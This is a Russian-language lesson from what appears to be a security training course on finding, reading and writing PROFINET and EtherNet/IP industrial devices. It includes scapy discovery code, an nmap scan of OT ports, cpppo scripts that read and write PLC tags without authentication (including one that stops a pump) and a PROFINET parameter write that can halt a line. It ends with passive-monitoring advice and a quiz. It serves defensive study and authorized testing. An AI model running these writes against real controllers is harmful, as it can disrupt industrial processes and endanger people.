---
id: hardware-profinet-enip
title: "Profinet и EtherNet/IP"
category: hardware
parent: hardware-mod-ics-protocols
difficulty: hard
order: 2
tags: [profinet, ethernetip, cip, ics]
prerequisites: [hardware-dnp3, hardware-ics]
useful_for:
  - "Пентест промышленных Ethernet-сетей"
  - "Аудит дискретного производства"
  - "CTF Hardware/ICS"
estimated_minutes: 70
summary: "Промышленный Ethernet: PROFINET (DCP, RT/IRT, GSDML) и EtherNet/IP (CIP, explicit/implicit messaging, список тегов). Обнаружение, чтение и запись через явные сообщения, риски и защита."
---

## Вопрос, с которого всё начинается

В прошлом уроке мы разбирали DNP3 — «серийный» протокол телеметрии. Но на заводе, где конвейер должен получать команды каждые несколько миллисекунд, такие протоколы не годятся: нужен промышленный Ethernet с жёстким детерминизмом. Его строят на двух стандартах — **PROFINET** (Siemens) и **EtherNet/IP** (Rockwell).

Вопрос урока: как найти устройства в промышленной Ethernet-сети, прочитать их данные и, главное, понять — можно ли писать в контроллер без пароля?

## Наш пример: смешанный цех Siemens + Rockwell

Перед нами сегмент `10.0.0.0/24` дискретного производства. На одном участке — Siemens с полевым модулем ввода-вывода, на другом — контроллер Rockwell. Сначала одним проходом посмотрим, кто вообще слушает типовые OT-порты:

```bash
$ nmap -p 102,502,44818,20000,34964 -sV --open 10.0.0.0/24
Nmap scan report for 10.0.0.20
PORT      STATE SERVICE
102/tcp   open  iso-tsap
502/tcp   open  mbap
44818/tcp open  EtherNet-IP-2
```

Порт `102` (Siemens S7), `502` (Modbus) и `44818` (EtherNet/IP) на одном хосте — классический признак плохо сегментированного объекта: смешались оборудование двух вендоров и «прослойка» Modbus. Это уже интересно.

## Шаг 1: PROFINET — кто здесь кто

**PROFINET** — стандарт Siemens и ассоциации PI. Три роли:

- **IO-Controller** — «мозг», это ПЛК; он управляет устройствами.
- **IO-Device** — полевое устройство: модуль ввода-вывода, привод, датчик.
- **IO-Supervisor** — инженерная станция для диагностики.

Ключевые механизмы:

- **DCP** (Discovery and Configuration Protocol) — обнаружение и назначение имени/IP по L2.
- **RT** (Real-Time) — циклический обмен реального времени.
- **IRT** (Isochronous RT) — синхронный, для задач движения (motion).
- **GSDML** — XML-описание устройства: какие у него модули и параметры.

Самое важное для атаки: IO-Controller привязывается к IO-Device **по имени**, а не по MAC. Кто переименует устройство — перенаправит контроллер на другой физический модуль.

## Шаг 2: находим устройства по DCP

DCP работает по «сырому» L2, поэтому шлём кадр на широковещательный PROFINET-адрес. **EtherType** — поле в Ethernet-кадре, которое говорит «это PROFINET»; у него значение `0x8892`:

```python
from scapy.all import *
from scapy.contrib.pnio import *
pkt = Ether(dst="01:0e:cf:00:00:00")/PNIO()
sendp(pkt, iface="eth0", loop=1, inter=1)
```

Устройства отвечают, и в Wireshark мы видим их «паспорт»:

```text
PROFINET DCP
  Service ID: Identify (0x05)
  Station Name: plc-line1
  IP: 10.0.0.20
  Device Vendor: Siemens
  Device Type: ET200SP
```

Мы узнали имя `plc-line1`, адрес `10.0.0.20` и модель `ET200SP`. Готовым инструментом это делается одной командой (пакет `profinet-tools`):

```bash
$ python3 pnio_dcp.py -i eth0 -l
plc-line1   10.0.0.20   ET200SP   Siemens
valve-7     10.0.0.41   ET200SP   Siemens
```

## Шаг 3: EtherNet/IP — CIP внутри

**EtherNet/IP** — это реализация **CIP** (Common Industrial Protocol) поверх Ethernet. Здесь свои роли: **Scanner** (аналог IO-Controller) опрашивает, **Adapter** (аналог IO-Device) отвечает.

CIP описывает объекты: Identity, Assembly, Connection Manager и другие. Для нас важны два вида обмена:

- **Implicit (Class 1)** — циклический, через UDP/2222, по заранее установленному соединению.
- **Explicit** — запрос-ответ через TCP/44818; именно им читают и пишут теги.

Обнаружить устройство можно запросом **ListIdentity** по UDP/44818:

```python
from scapy.all import *
from scapy.contrib.enip import *
pkt = Ether()/IP(dst="10.0.0.255")/UDP(sport=44818, dport=44818)/ENIP()/ENIPListIdentity()
sendp(pkt, iface="eth0")
```

Ответ содержит Identity Object — «паспорт» контроллера:

```text
EtherNet/IP ListIdentity Reply
  Vendor ID: 1 (Rockwell Automation/Allen-Bradley)
  Device Type: 14 (Programmable Logic Controller)
  Product Name: CompactLogix 5380
  State: RUN
  IP: 10.0.0.30
```

`Product Name` говорит, что это за контроллер, а `State: RUN` — что программа сейчас исполняется. В `PROGRAM` логика не работает, и запись тега может не дать эффекта.

## Шаг 4: читаем теги

**Тег** — это именованная переменная в программе ПЛК (например, `TankLevel`). Через explicit messaging их читают инструментом `cpppo`:

```bash
$ pip install cpppo
$ python3 - <<'PY'
from cpppo.server.enip.get_attribute import proxy_simple as proxy
p = proxy(['10.0.0.30'])
for tag in ['Program:MainProgram.TankLevel', 'Program:MainProgram.PumpRun']:
    v, = p.read([tag])
    print(tag, '=', v)
PY
Program:MainProgram.TankLevel = 78.4
Program:MainProgram.PumpRun = True
```

Мы прочитали уровень в резервуаре и состояние насоса. Никакого пароля не потребовалось — explicit messaging по умолчанию открыт.

## Шаг 5: пишем тег — и меняем физический процесс

Записать тег так же просто:

```python
from cpppo.server.enip.get_attribute import proxy_simple as proxy
p = proxy(['10.0.0.30'])
p.write([('Program:MainProgram.PumpRun', False)])
print("PumpRun set to False")
```

Эта строка останавливает насос. **Это реальное физическое действие**, поэтому — только в лаборатории или по письменному разрешению. В лаборатории удобно проверить цикл «до/после»:

```text
before: 50.0
after:  75.0
```

## Шаг 6: PROFINET — запись параметров

PROFINET тоже позволяет писать параметры модулей через acyclic (NRT) сервисы:

```python
from profinet import ProfinetDevice
d = ProfinetDevice("eth0", "plc-line1")
d.connect()
print(d.read_parameters())
d.write_parameter("CycleTime", 16)   # мс
```

Неверный параметр может нарушить цикл обмена и остановить линию — это атака на целостность, не требующая пароля.

## Шаг 7: почему защиты нет

Корень проблемы: **DCP и ENIP by design не аутентифицируют отправителя.** Из этого вырастают векторы:

- Переименование IO-Device через DCP Set — контроллер теряет свой модуль.
- Спуфинг IO-Device — подмена полевого устройства с ложными данными.
- Запись тегов через CIP explicit — смена уставок и команд.
- DoS на RT-трафик — нарушение детерминизма, уход контроллера в ошибку.
- GSDML/EDS-файлы описаний иногда содержат учётки и параметры.

## Шаг 8: как это видят и ловят

В OT-сети активное сканирование рискованно, поэтому основа — пассивный мониторинг. Захватываем зеркальный порт и строим базлайн:

```bash
$ tcpdump -i eth0 -n 'ether proto 0x8892 or tcp port 44818' -w ot.pcap
```

Полезные фильтры Wireshark: `pn_rt`, `pn_dcp`, `enip`, `cip`. В норме вы видите один и тот же циклический обмен; аномалия — внезапный `DCP Set`, необычная запись тега или всплеск Hard Reset. Именно так замечают переименование устройств и запись уставок, которых «не должно быть».

## Что мы теперь знаем

1. PROFINET и EtherNet/IP — промышленный Ethernet; работают по L2 (EtherType `0x8892`) и по TCP/UDP.
2. DCP находит и **переименовывает** устройства по L2 — привязка идёт по имени, не по MAC.
3. EtherNet/IP = CIP; explicit (TCP/44818) читает и пишет теги, implicit (UDP/2222) — циклический обмен.
4. Теги читаются и пишутся без аутентификации (`cpppo`, `pycomm3`).
5. Защита — только сегментация и физический контроль; протоколы сами отправителя не проверяют.

## На что смотреть дальше

- **Устройства не отвечают на DCP.** Проверьте dst-MAC `01:0e:cf:00:00:00` и VLAN: промышленные сети часто в VLAN, поставьте интерфейс в нужный.
- **Implicit-соединения не читаются «на лету».** Их надо установить; для анализа удобнее explicit.
- **Нет символических имён.** Некоторые ПЛК требуют EDS-файл и работу через Assembly-объекты.
- **Второй scanner не подключается.** Class 1 соединение занято первым сканером.
- **`State: PROGRAM`.** Запись тега может не дать эффекта — логика не исполняется.

## Квиз

Проверь себя.

```quiz
- question: "На каком EtherType работает PROFINET DCP?"
  options:
    - "0x0800"
    - "0x8892"
    - "0x8100"
    - "0x86DD"
  answer: 1
  explanation: "PROFINET использует EtherType 0x8892."
- question: "Какой порт у EtherNet/IP explicit messaging?"
  options:
    - "502"
    - "20000"
    - "44818"
    - "34964"
  answer: 2
  explanation: "Explicit CIP — TCP/44818."
- question: "Почему переименование IO-Device через DCP опасно?"
  options:
    - "Устройство перегреется"
    - "IO-Controller привязан к устройству по имени и потеряет связь"
    - "Порт закроется"
    - "Изменится MAC"
  answer: 1
  explanation: "Привязка по Station Name делает переименование атакой целостности."
- question: "Что такое CIP?"
  options:
    - "Тип кабеля"
    - "Common Industrial Protocol — прикладной уровень EtherNet/IP"
    - "Протокол шифрования"
    - "Формат файла"
  answer: 1
  explanation: "CIP — прикладной протокол, на котором стоит EtherNet/IP."
- question: "Каким инструментом читают и пишут теги Allen-Bradley?"
  options:
    - "nmap"
    - "cpppo / pycomm3"
    - "tcpdump"
    - "binwalk"
  answer: 1
  explanation: "cpppo и pycomm3 работают с ENIP/CIP и тегами Logix."
```

## Куда дальше

Мы научились читать и писать данные контроллера. В следующем уроке пойдём глубже — разберём, как устроен сам ПЛК: цикл сканирования, лестничную логику, режимы RUN/STOP и почему вмешательство в логику опаснее, чем в сеть. А пока запомни главное: **промышленный Ethernet не проверяет, кто говорит, — и это его главная слабость.**

## Где пригодится

- **Пентест:** аудит дискретного производства (Siemens/Rockwell).
- **CTF:** задачи Hardware/ICS по промышленному Ethernet.
- **Аудит:** проверка сегментации и доступа к 44818/RT.
- **Работа:** проектирование защищённых OT-сетей.
- **Дальше по дереву:** `hardware-plc-deep`, `hardware-ics`.
